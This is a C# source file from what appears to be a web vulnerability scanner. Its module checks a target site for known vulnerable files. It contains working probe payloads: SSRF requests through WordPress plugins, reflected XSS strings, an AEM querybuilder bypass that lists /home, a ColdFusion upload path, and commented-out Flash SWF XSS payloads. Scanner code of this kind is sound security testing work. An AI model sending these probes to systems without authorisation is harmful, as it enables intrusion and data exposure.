using Clark.Attack.Common.Interfaces;
using Clark.Attack.Common.Models;
using Clark.Attack.VulnerableFiles.Models;
using Clark.Common.Models;
using Clark.Common.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Clark.Attack.VulnerableFiles
{
    /// <summary>
    /// Check for known vulnerable files
    /// </summary>
    public class Processor : IAttack
    {
        public string Name { get { return "Vulnerable Files"; } set { } }

        #region Private

        private List<VulnerableFile> _vulnerableFiles = new List<VulnerableFile>()
        {
            new VulnerableFile()
            {
                File = "wp-content/plugins/qards/html2canvasproxy.php?url=https://google.com",
                Attacks = new List<string>() { },
                FingerPrint = new List<string>() { "<title>Google</title>" }
            },
            new VulnerableFile()
            {
                File = "wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=https://google.com",
                Attacks = new List<string>() { },
                FingerPrint = new List<string>() { "<title>Google</title>" }
            },
            new VulnerableFile()
            {
                File = "7/0/34/aeb617f1a7b102/curiosity-media.discovery.com/hogarth45.html",
                Attacks = new List<string>() { },
                FingerPrint = new List<string>() { "POC for Hogarth45" }
            },

            new VulnerableFile()
            {
                File = "f/229/201/7d/home.peoplepc.com/psp/editlgf8s--%3E<img src%3da onerror%3dalert(1234)>vq0zz/email.asp",
                Attacks = new List<string>() { },
                FingerPrint = new List<string>() { "onerror=alert(1234)" }
            },

            new VulnerableFile()
            {
                File = "f/465/1984/1d/www.ingentaconnect.com/content/jbp/intp/2010/00000012/00000001/art00002?tp=z%22%3E%3Csvg%20onload=window.onerror=n=confirm,n(1234)%3E%3C/svg%3Ebwgjq&a=directorio&d=0003300-2009-05-26.php",
                Attacks = new List<string>() { },
                FingerPrint = new List<string>() { "n(1234)></svg>" }
            },

            /////bin///querybuilder.json.servlet;%0aa.css?path=/home&p.hits=full&p.limit=-1

            new VulnerableFile()
            {
                File = "//bin///querybuilder.json.servlet;%0aa.css?path=/home&p.hits=full&p.limit=-1",
                Attacks = new List<string>() { },
                FingerPrint = new List<string>() { "rep:AccessControllable" }
            },

            new VulnerableFile()
            {
                File = "cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm",
                Attacks = new List<string>() { },
                FingerPrint = new List<string>() { "The web site you are accessing has experienced an unexpected error" }
            }

            //Todo: figure out how to fingerprint swf files
            //https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61

            //_knownAttackFiles.Add(new AttackFile()
            //{
            //    File = "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf",
            //    Attacks = new List<string>() { 
            //        "?onclick=jav%gascript:confirm(1)"
            //    }
            //});

            //_knownAttackFiles.Add(new AttackFile()
            //{
            //    File = "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf",
            //    Attacks = new List<string>() { 
            //        "?contentPath=%5c\"))%7dcatch(e)%7balert(1)%7d//"
            //    }
            //});

            //_knownAttackFiles.Add(new AttackFile()
            //{
            //    File = "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf",
            //    Attacks = new List<string>() { 
            //        "?javascriptCallbackFunction=alert(1)-String"
            //    }
            //});

            //_knownAttackFiles.Add(new AttackFile()
            //{
            //    File = "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf",
            //    Attacks = new List<string>() { 
            //        "?movieName=%22])%7bif(!this.x)alert(1),this.x=1%7d//"
            //    }
            //});

            //_knownAttackFiles.Add(new AttackFile()
            //{
            //    File = "/libs/cq/ui/resources/swfupload/swfupload.swf",
            //    Attacks = new List<string>() { 
            //        "?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(1),this.x=1%7d//"
            //    }
            //});

            //_knownAttackFiles.Add(new AttackFile()
            //{
            //    File = "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf",
            //    Attacks = new List<string>() { 
            //        "?stagesize=1&namespacePrefix=alert(1)-window"
            //    }
            //});

            //_knownAttackFiles.Add(new AttackFile()
            //{
            //    File = "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf",
            //    Attacks = new List<string>() { 
            //        "?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(1)%7dcatch(e)%7b%7d//"
            //    }
            //});

            //_knownAttackFiles.Add(new AttackFile()
            //{
            //    File = "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf",
            //    Attacks = new List<string>() { 
            //        "?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](1)-window"
            //    }
            //});

        };

        #endregion

        public AttackResult Check(AttackRequest request)
        {
            var result = new AttackResult();

            foreach (var vuln in _vulnerableFiles)
            {
                FindFile(request.URL, vuln, result);
            }

            return result;
        }

        private void FindFile(string url, VulnerableFile vuln, AttackResult result)
        {
            string testedFile = url.Trim('/') + "/" + vuln.File;
            WebPageRequest webRequest = new WebPageRequest(testedFile);
            WebPageLoader.Load(webRequest);
            
            if (webRequest.Response.Code.Equals("200"))
            {
                bool anyFingerPrint = false;
                foreach (string fp in vuln.FingerPrint)
                {
                    if (webRequest.Response.Body.Contains(fp))
                    {
                        anyFingerPrint = true;
                        break;
                    }
                }

                if(anyFingerPrint)
                {
                    result.Success=true;
                    string attackString = vuln.Attacks.FirstOrDefault();
                    if (!String.IsNullOrEmpty(attackString))
                        testedFile = testedFile + attackString;
                    result.Results.Enqueue(testedFile);
                }
            }
        }
    }
}
